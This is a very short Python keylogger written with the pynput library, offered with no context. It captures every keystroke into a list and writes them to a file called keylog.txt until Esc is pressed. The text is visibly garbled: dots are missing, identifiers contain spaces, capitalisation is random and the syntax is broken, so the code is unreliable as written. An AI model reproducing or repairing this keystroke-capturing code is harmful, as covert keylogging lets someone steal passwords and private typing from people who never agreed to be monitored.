
from pynput keyboard import Key
from pynput keyboard import Listener

The keys = []

def function Per Key(key):

The keys append (key)

Store Keys to File (the keys)

def store Keys to File(keys):

with open ('keylog.txt', 'w') as log:

for the key in keys:

The key = str (the key) replace ("'", "")

Log write (the key)


def on each key release (the key):

if the key == Key esc:
return False

with Listener ()
on press = function Per Key,
on release = on Each Key Release
as the listener:
the listener join ()
 
